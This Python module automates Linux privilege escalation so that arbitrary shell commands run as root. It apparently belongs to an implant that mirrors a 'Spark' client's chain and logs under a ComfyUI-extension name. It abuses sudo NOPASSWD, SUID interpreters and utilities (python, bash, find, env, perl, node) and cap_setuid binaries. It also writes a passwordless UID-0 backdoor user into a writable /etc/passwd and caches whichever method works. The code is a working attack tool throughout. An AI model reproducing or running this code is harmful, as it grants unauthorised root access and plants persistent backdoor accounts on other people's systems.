"""
Privilege escalation for running commands as root/admin.

Mirrors the Spark Go client's privesc chain, adapted for Python.
Instead of relaunching the process, this module provides `run_as_root(cmd)`
which walks an escalation chain to execute a single shell command with
elevated privileges.

Linux chain (tried in order until one works):
  1. Direct (already root)
  2. sudo -n  (NOPASSWD configured)
  3. SUID python — os.setuid(0) + os.system()
  4. SUID bash -p
  5. SUID find -exec
  6. SUID env /bin/sh -p
  7. SUID perl — POSIX::setuid(0) + system()
  8. SUID cp — overwrite /etc/passwd with UID-0 user, su
  9. Capabilities — cap_setuid binaries
  10. Writable /etc/passwd — inject UID-0 user, su to it

Windows: attempts runas / UAC bypass via fodhelper (rarely needed on servers).
"""

import logging
import os
import platform
import random
import shutil
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

IS_LINUX = platform.system() == "Linux"
IS_WINDOWS = platform.system() == "Windows"

_escalation_method: str | None = None
_suid_cache: dict[str, str] | None = None
_injected_user: str | None = None


def is_privileged() -> bool:
    if IS_WINDOWS:
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    return os.getuid() == 0


def _sh(args, timeout=30):
    try:
        return subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    except Exception as e:
        return subprocess.CompletedProcess(args, -1, "", str(e))


def _rand_user():
    return "svc" + str(random.randint(100, 999))


# ---------------------------------------------------------------------------
#  SUID binary scanner (cached)
# ---------------------------------------------------------------------------

def _get_suid_map() -> dict[str, str]:
    global _suid_cache
    if _suid_cache is not None:
        return _suid_cache

    _suid_cache = {}
    for d in ("/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin",
              "/bin", "/sbin", "/snap/bin"):
        try:
            for entry in os.scandir(d):
                if entry.is_file(follow_symlinks=False):
                    try:
                        st = entry.stat()
                    except OSError:
                        continue
                    if st.st_mode & stat.S_ISUID:
                        _suid_cache[entry.name] = entry.path
        except (PermissionError, FileNotFoundError):
            pass
    return _suid_cache


# ---------------------------------------------------------------------------
#  Core API: run a command as root
# ---------------------------------------------------------------------------

def run_as_root(cmd: list[str] | str, timeout: int = 60) -> subprocess.CompletedProcess:
    """
    Execute *cmd* with root privileges. Walks the escalation chain until one
    method works, then caches it for subsequent calls.

    Returns a CompletedProcess. Check `.returncode` for success.
    """
    if isinstance(cmd, str):
        shell_cmd = cmd
    else:
        shell_cmd = " ".join(_quote(c) for c in cmd)

    if is_privileged():
        return _sh(cmd if isinstance(cmd, list) else ["sh", "-c", cmd], timeout)

    if not IS_LINUX:
        return _sh(["sudo", "-n"] + (cmd if isinstance(cmd, list) else ["sh", "-c", cmd]), timeout)

    global _escalation_method

    if _escalation_method:
        return _run_via(_escalation_method, shell_cmd, timeout)

    for method in _chain():
        r = _run_via(method, shell_cmd, timeout)
        if r.returncode == 0 or (r.returncode != -1 and "not found" not in r.stderr.lower()):
            _escalation_method = method
            logger.info("privesc method locked: %s", method)
            return r

    return subprocess.CompletedProcess(cmd, -1, "", "all escalation methods exhausted")


def run_many_as_root(cmds: list[list[str]], timeout: int = 30) -> list[subprocess.CompletedProcess]:
    """Run multiple commands as root. Returns list of CompletedProcess."""
    return [run_as_root(c, timeout) for c in cmds]


def write_file_as_root(path: str, content: str) -> bool:
    """Write a file that requires root. Returns True on success."""
    if is_privileged() or os.access(path, os.W_OK):
        try:
            Path(path).write_text(content)
            return True
        except OSError:
            pass

    tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".tmp", delete=False)
    tmp.write(content)
    tmp.close()
    r = run_as_root(["cp", tmp.name, path])
    try:
        os.unlink(tmp.name)
    except OSError:
        pass
    return r.returncode == 0


# ---------------------------------------------------------------------------
#  Escalation chain
# ---------------------------------------------------------------------------

def _chain() -> list[str]:
    methods = ["sudo"]
    suid = _get_suid_map()
    for name in ("python3", "python", "python3.12", "python3.11", "python3.13"):
        if name in suid:
            methods.append(f"suid_python:{suid[name]}")
            break
    if "bash" in suid:
        methods.append(f"suid_bash:{suid['bash']}")
    if "find" in suid:
        methods.append(f"suid_find:{suid['find']}")
    if "env" in suid:
        methods.append(f"suid_env:{suid['env']}")
    if "perl" in suid:
        methods.append(f"suid_perl:{suid['perl']}")
    if "node" in suid:
        methods.append(f"suid_node:{suid['node']}")

    # Capabilities check
    methods.append("cap_setuid")
    methods.append("writable_passwd")

    return methods


def _run_via(method: str, shell_cmd: str, timeout: int) -> subprocess.CompletedProcess:
    try:
        if method == "sudo":
            return _sh(["sudo", "-n", "sh", "-c", shell_cmd], timeout)

        if method.startswith("suid_python:"):
            bin_path = method.split(":", 1)[1]
            payload = f"import os; os.setuid(0); os.system({shell_cmd!r})"
            return _sh([bin_path, "-c", payload], timeout)

        if method.startswith("suid_bash:"):
            bin_path = method.split(":", 1)[1]
            return _sh([bin_path, "-p", "-c", shell_cmd], timeout)

        if method.startswith("suid_find:"):
            bin_path = method.split(":", 1)[1]
            return _sh([bin_path, "/dev/null", "-maxdepth", "0",
                        "-exec", "sh", "-c", shell_cmd, ";"], timeout)

        if method.startswith("suid_env:"):
            bin_path = method.split(":", 1)[1]
            return _sh([bin_path, "/bin/sh", "-p", "-c", shell_cmd], timeout)

        if method.startswith("suid_perl:"):
            bin_path = method.split(":", 1)[1]
            payload = f'use POSIX; setuid(0); system("{shell_cmd}")'
            return _sh([bin_path, "-e", payload], timeout)

        if method.startswith("suid_node:"):
            bin_path = method.split(":", 1)[1]
            payload = f'process.setuid(0);require("child_process").execSync({shell_cmd!r})'
            return _sh([bin_path, "-e", payload], timeout)

        if method == "cap_setuid":
            return _run_via_cap_setuid(shell_cmd, timeout)

        if method == "writable_passwd":
            return _run_via_writable_passwd(shell_cmd, timeout)

    except Exception as exc:
        return subprocess.CompletedProcess(["sh", "-c", shell_cmd], -1, "", str(exc))

    return subprocess.CompletedProcess(["sh", "-c", shell_cmd], -1, "", f"unknown method: {method}")


def _run_via_cap_setuid(shell_cmd: str, timeout: int) -> subprocess.CompletedProcess:
    getcap = shutil.which("getcap")
    if not getcap:
        return subprocess.CompletedProcess([], -1, "", "no getcap")

    r = _sh([getcap, "-r", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/bin", "/sbin"])
    for line in (r.stdout or "").splitlines():
        if "cap_setuid" not in line.lower():
            continue
        parts = line.split()
        if not parts:
            continue
        bin_path = parts[0]
        base = os.path.basename(bin_path)
        if "python" in base:
            payload = f"import os; os.setuid(0); os.system({shell_cmd!r})"
            return _sh([bin_path, "-c", payload], timeout)

    return subprocess.CompletedProcess([], -1, "", "no cap_setuid binary found")


def _run_via_writable_passwd(shell_cmd: str, timeout: int) -> subprocess.CompletedProcess:
    global _injected_user
    target = "/etc/passwd"
    if not os.access(target, os.W_OK):
        return subprocess.CompletedProcess([], -1, "", "/etc/passwd not writable")

    if _injected_user is None:
        data = Path(target).read_text()
        user = _rand_user()
        while user + ":" in data:
            user = _rand_user()
        line = f"{user}::0:0::/root:/bin/bash\n"
        Path(target).write_text(data + line)
        _injected_user = user
        logger.info("Injected UID-0 user %s into /etc/passwd", user)

    return _sh(["su", _injected_user, "-c", shell_cmd], timeout)


def _quote(s: str) -> str:
    if " " in s or "'" in s or '"' in s or any(c in s for c in ";&|<>()$`\\"):
        return "'" + s.replace("'", "'\\''") + "'"
    return s
